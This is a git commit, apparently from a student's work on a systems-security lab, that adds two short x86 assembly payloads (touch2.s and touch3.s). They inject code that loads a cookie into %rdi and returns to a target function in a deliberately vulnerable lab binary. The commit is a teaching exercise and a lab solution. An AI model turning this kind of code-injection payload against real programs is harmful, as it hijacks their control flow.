cb00ecf54b16a24cae1bab92a91137fd7b11e522
lph <lph123@qq.com>
2019-05-21 22:59:03 +0800

    complete ctarget

---
+++ target1/touch2.s
@@ -0,0 +1,3 @@
+movl $0x59b997fa,%edi #mov cookie to %rdi
+push $0x4017ec        #return to touch2 
+ret 
---
+++ target1/touch3.s
@@ -0,0 +1,3 @@
+movq $0x5561dca8, %rdi /* mov cookie to %rdi */ 
+push $0x4018fa        /* address of touch3 */
+ret
